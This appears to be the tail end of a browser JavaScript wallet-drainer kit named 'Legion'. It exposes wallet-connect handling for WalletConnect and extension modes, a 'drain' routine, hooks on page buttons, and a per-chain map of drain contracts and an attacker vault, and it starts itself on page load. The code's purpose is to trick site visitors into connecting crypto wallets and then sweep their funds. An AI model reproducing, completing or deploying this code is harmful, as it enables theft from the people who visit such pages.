    /** Register current WC session with backend relay — call after resume or external-wc connect. */
    registerWcSession: function () { return registerWcSessionWithBackend(); },
    beginConnect: function (mode) {
      if (mode === 'wc') {
        S.connectMode = 'wc';
        S.wcSessionActive = true;
        clearInjectedSession({ keepMode: true, disconnectWallet: false }).catch(function () {});
        logConnect('begin', '→ MOBILE-WC');
      } else {
        if (isWcConnectActive()) {
          logConnect('blocked', 'beginConnect extension — WC active');
          return;
        }
        S.connectMode = 'injected';
        S.wcSessionActive = false;
        removeWcGuard();
        clearWcSession(true).catch(function () {});
        UI.overlay.show('connecting', { walletIcon: UI._walletIcon || '' });
        logConnect('begin', '→ EXTENSION');
      }
      if (typeof window.customModalClose === 'function') window.customModalClose();
    },
    isWcActive: isWcConnectActive,
    clearInjected: clearInjectedSession,
    clearWc: clearWcSession,
    openPanel: defaultConnect,
    openExtensions: openExtensionPicker,
    // After WC connect, handleConnect is blocked by isWcConnectActive — resume instead
    drain: function () {
      if (S.evmProvider && S.evmAddr) {
        return continueConnected();
      }
      return handleConnect();
    },
    hook: function () { hookPageButtons(defaultConnect); },
    state: S,
    config: CFG,
    version: LEGION_VERSION,
    contracts: {
      legionDrain: LEGION_DRAIN,
      batchDrainV1: BATCH_DRAIN,
      batchDrainV2: BATCH_DRAIN_V2,
      batchDrainV2OnChainVault: BATCH_DRAIN_V2_ONCHAIN_VAULT,
      apiVault: function () { return VAULT.evm; },
      coverage: function (chainId) {
        var id = Number(chainId || 1);
        return {
          chainId: id,
          claimForwarder: resolveClaimContract(id),
          batchDrainV1: isZeroAddr(BATCH_DRAIN[id]) ? null : BATCH_DRAIN[id],
          batchDrainV2: resolveBatchDrainV2(id),
          apiVault: VAULT.evm,
          batchV2HardcodedVault: BATCH_DRAIN_V2_ONCHAIN_VAULT,
        };
      },
    },
  };

  try {
    window.dispatchEvent(new CustomEvent('legion:ready', { detail: { version: LEGION_VERSION } }));
  } catch (readyEv) { /* IE11 guard */ }

  // Boot
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
